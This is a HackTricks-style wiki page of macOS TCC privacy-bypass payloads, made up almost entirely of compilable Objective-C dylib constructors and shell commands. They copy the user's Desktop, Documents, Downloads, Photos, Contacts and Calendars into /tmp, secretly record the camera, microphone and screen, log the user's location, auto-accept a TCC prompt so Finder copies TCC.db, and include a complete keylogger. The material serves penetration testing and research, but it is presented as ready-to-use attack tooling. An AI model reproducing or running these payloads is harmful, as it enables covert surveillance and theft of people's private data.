# macOS TCC Payloads

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Desktop

* **Entitlement**: None
* **TCC**: kTCCServiceSystemPolicyDesktopFolder

{% tabs %}
{% tab title="ObjetiveC" %}
Copy `$HOME/Desktop` to `/tmp/desktop`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
    NSString *tmpPhotosPath = @"/tmp/desktop";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/Desktop` to `/tmp/desktop`.

```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{% endtab %}
{% endtabs %}

### Documents

* **Entitlement**: None
* **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{% tabs %}
{% tab title="ObjetiveC" %}
Copy `$HOME/Documents` to `/tmp/documents`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *tmpPhotosPath = @"/tmp/documents";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/`Documents to `/tmp/documents`.

```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{% endtab %}
{% endtabs %}

### Downloads

* **Entitlement**: None
* **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{% tabs %}
{% tab title="ObjetiveC" %}
Copy `$HOME/Downloads` to `/tmp/downloads`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
    NSString *tmpPhotosPath = @"/tmp/downloads";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/Dowloads` to `/tmp/downloads`.

```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{% endtab %}
{% endtabs %}

### Photos Library

* **Entitlement**: `com.apple.security.personal-information.photos-library`
* **TCC**: `kTCCServicePhotos`

{% tabs %}
{% tab title="ObjetiveC" %}
Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
    NSString *tmpPhotosPath = @"/tmp/photos";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.

```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{% endtab %}
{% endtabs %}

### Contacts

* **Entitlement**: `com.apple.security.personal-information.addressbook`
* **TCC**: `kTCCServiceAddressBook`

{% tabs %}
{% tab title="ObjetiveC" %}
Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
    NSString *tmpPhotosPath = @"/tmp/contacts";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.

```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{% endtab %}
{% endtabs %}

### Calendar

* **Entitlement**: `com.apple.security.personal-information.calendars`
* **TCC**: `kTCCServiceCalendar`

{% tabs %}
{% tab title="ObjectiveC" %}
Copy `$HOME/Library/Calendars` to `/tmp/calendars`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;    

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
    NSString *tmpPhotosPath = @"/tmp/calendars";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Copy `$HOME/Library/Calendars` to `/tmp/calendars`.

```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{% endtab %}
{% endtabs %}

### Camera

* **Entitlement**: `com.apple.security.device.camera`
* **TCC**: `kTCCServiceCamera`

{% tabs %}
{% tab title="ObjetiveC - Record" %}
Record a 3s video and save it in **`/tmp/recording.mov`**

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
    if (error) {
        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
        return;
    }
    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }
    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = @"/tmp/recording.mov";
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ObjectiveC - Check" %}
Check if the program has access to the camera.

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to camera granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to camera denied.");
        return NO;
    }
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    [CameraAccessChecker hasCameraAccess];
    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="Shell" %}
Take a photo with the camera

```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{% endtab %}
{% endtabs %}

### Microphone

* **Entitlement**: **com.apple.security.device.audio-input**
* **TCC**: `kTCCServiceMicrophone`

{% tabs %}
{% tab title="ObjetiveC - Record" %}
Record 5s of audio an store it in `/tmp/recording.m4a`

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

    if (error) {
        NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }

    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}

- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
    NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

    freopen("/tmp/logs.txt", "a", stderr);
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    fclose(stderr); // Close the file stream
}
```
{% endtab %}

{% tab title="ObjectiveC - Check" %}
Check if the app has access to the mricrophone.

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to microphone granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to microphone denied.");
        return NO;
    }
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    [MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{% endtab %}

{% tab title="Shell" %}
Record a 5s audio and store it in `/tmp/recording.wav`

```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{% endtab %}
{% endtabs %}

### Location

{% hint style="success" %}
For an app to get the location, **Location Services** (from Privacy & Security) **must be enabled,** if not it won't be able to access it.
{% endhint %}

* **Entitlement**: `com.apple.security.personal-information.location`
* **TCC**: Granted in `/var/db/locationd/clients.plist`

{% tabs %}
{% tab title="ObjectiveC" %}
Write the location in `/tmp/logs.txt`

```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    NSLog(@"Current location: %@", location);
    exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Error getting location: %@", error);
    exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{  
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSLog(@"Getting location");
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
    locationManager.delegate = delegate;

    [locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
    [locationManager startUpdatingLocation];

    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
    while (true) {
        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    }

    NSLog(@"Location completed successfully.");
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{% endtab %}

{% tab title="Shell" %}
Get access to the location

```
???
```
{% endtab %}
{% endtabs %}

### Screen Recording

* **Entitlement**: None
* **TCC**: `kTCCServiceScreenCapture`

{% tabs %}
{% tab title="ObjectiveC" %}
Record the main screen for 5s in `/tmp/screen.mov`

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output 
    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL 
    fromConnections:(NSArray *)connections 
    error:(NSError *)error {
    if (error) {
        NSLog(@"Recording error: %@", error);
    } else {
        NSLog(@"Recording finished successfully.");
    }
    exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
    if ([captureSession canAddInput:screenInput]) {
        [captureSession addInput:screenInput];
    }

    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([captureSession canAddOutput:fileOutput]) {
        [captureSession addOutput:fileOutput];
    }

    [captureSession startRunning];

    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

    // Run the loop for 5 seconds to capture
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [fileOutput stopRecording];
    });

    CFRunLoopRun();
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{% endtab %}

{% tab title="Shell" %}
Record the main screen for 5s

```bash
screencapture -V 5 /tmp/screen.mov
```
{% endtab %}
{% endtabs %}

### Accessibility

* **Entitlement**: None
* **TCC**: `kTCCServiceAccessibility`

Use the TCC privilege to accept the control of Finder pressing enter and bypass TCC that way

{% tabs %}
{% tab title="Accept TCC" %}
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
    CGEventPost(kCGHIDEventTap, keyDownEvent);
    CGEventPost(kCGHIDEventTap, keyUpEvent);
    if (keyDownEvent) CFRelease(keyDownEvent);
    if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
    NSLog(@"Starting AppleScript");
    NSString *scriptSource = @"tell application \"Finder\"\n"
                             "set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
                             "set targetFolder to POSIX file \"/tmp\" as alias\n"
                             "duplicate file sourceFile to targetFolder with replacing\n"
                             "end tell\n";

    NSDictionary *errorDict = nil;
    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
    [appleScript executeAndReturnError:&errorDict];

    if (errorDict) {
        NSLog(@"AppleScript Error: %@", errorDict);
    }
}

int main() {
    @autoreleasepool {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            RunAppleScript();
        });

        // Simulate pressing the Enter key every 0.1 seconds
        NSLog(@"Starting key presses");
        for (int i = 0; i < 10; ++i) {
            SimulateKeyPress((CGKeyCode)36); // Key code for Enter
            usleep(100000); // 0.1 seconds
        }
    }
    return 0;
}
```
{% endtab %}

{% tab title="Keylogger" %}
Store the pressed keys in **`/tmp/keystrokes.txt`**

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
    if (fileHandle) {
        [fileHandle seekToEndOfFile];
        [fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
        [fileHandle closeFile];
    } else {
        // If the file does not exist, create it
        [str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        NSString *keyString = nil;
        // First, handle special non-printable keys
        switch (keyCode) {
            case kVK_Return: keyString = @"<Return>"; break;
            case kVK_Tab: keyString = @"<Tab>"; break;
            case kVK_Space: keyString = @"<Space>"; break;
            case kVK_Delete: keyString = @"<Delete>"; break;
            case kVK_Escape: keyString = @"<Escape>"; break;
            case kVK_Command: keyString = @"<Command>"; break;
            case kVK_Shift: keyString = @"<Shift>"; break;
            case kVK_CapsLock: keyString = @"<CapsLock>"; break;
            case kVK_Option: keyString = @"<Option>"; break;
            case kVK_Control: keyString = @"<Control>"; break;
            case kVK_RightControl: keyString = @"<Control>"; break;
            case kVK_RightShift: keyString = @"<Shift>"; break;
            case kVK_RightOption: keyString = @"<Option>"; break;
            case kVK_Function: keyString = @"<Function>"; break;
            case kVK_F1: keyString = @"<F1>"; break;
            case kVK_F2: keyString = @"<F2>"; break;
            case kVK_F3: keyString = @"<F3>"; break;
            // Add more cases here for other non-printable keys...
            default: break; // Not a special non-printable key
        }

        // If it's not a special key, try to translate it
        if (!keyString) {
            UniCharCount maxStringLength = 4;
            UniCharCount actualStringLength = 0;
            UniChar unicodeString[maxStringLength];
            
            TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
            CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
            const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
            
            UInt32 deadKeyState = 0;
            OSStatus status = UCKeyTranslate(keyboardLayout,
                                             keyCode,
                                             kUCKeyActionDown,
                                             0,
                                             LMGetKbdType(),
                                             kUCKeyTranslateNoDeadKeysBit,
                                             &deadKeyState,
                                             maxStringLength,
                                             &actualStringLength,
                                             unicodeString);
            CFRelease(currentKeyboard);

            if (status == noErr && actualStringLength > 0) {
                keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
            } else {
                keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
            }
        }

        NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
        AppendStringToFile(logString, kKeystrokesLogPath);
    }
    return event;
}

int main() {
    @autoreleasepool {
        CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

        if (!eventTap) {
            NSLog(@"Failed to create event tap");
            exit(1);
        }

        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }
    return 0;
}
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
**Accessibility is a very powerful permission**, you could abuse it in other ways, for example you could perform the **keystrokes attack** just from it without needed to call System Events.
{% endhint %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

